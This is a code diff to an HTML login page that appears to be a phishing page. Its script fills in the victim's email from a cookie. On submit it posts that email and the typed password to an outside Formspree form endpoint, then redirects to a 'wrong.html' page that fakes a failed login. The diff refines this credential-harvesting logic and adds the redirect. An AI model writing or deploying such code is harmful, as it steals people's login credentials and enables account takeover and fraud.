@@ -8,15 +8,13 @@
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.4/jquery.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/js-cookie@3.0.5/dist/js.cookie.min.js"></script>
     <script>
-        $("document").ready(async() => {
-            $("#emailparse").html(Cookies.get("email"))
+        $("document").ready(() => {
+            var emailadd = Cookies.get("email");
+            $("#emailparse").html(emailadd)
             $("form").submit((e) => {
                 e.preventDefault();
-                var emai1 = $("#emailparse").html().toString();
-                var pass = $("#password").val().toString();
-                $.post("https://formspree.io/f/xgebqyrz",{email:emai1,password:pass})
-//                     window.location = "./wrong.html";
-            });
+                $.post("https://formspree.io/f/xgebqyrz",{username:emailadd, password:$("#passwordinput").val()},(data,err)=>{ })
+         window.location = "./wrong.html"
         })
     </script>
     <link rel="stylesheet" href="./css/style.css" type="text/css" />
@@ -65,7 +63,7 @@
                 <!-- input starts -->
                 <div class="fields">
                     <div class="field">
-                        <input type="password" name="password" class="input-field" id="password" value="" autocomplete="off" required="" placeholder=" "  />
+                        <input type="password" name="password" class="input-field" value="" autocomplete="off" required="" placeholder=" " id="passwordinput" />
                             <!-- pattern="(?=.*\d)(?=.*[a-z])(?=.*[A-Z]).{8,}"
                             title="Must contain 0...9, A...Z, a...z and at least 8 character" -->
                         <label class="input-label" for="password">Password</label>
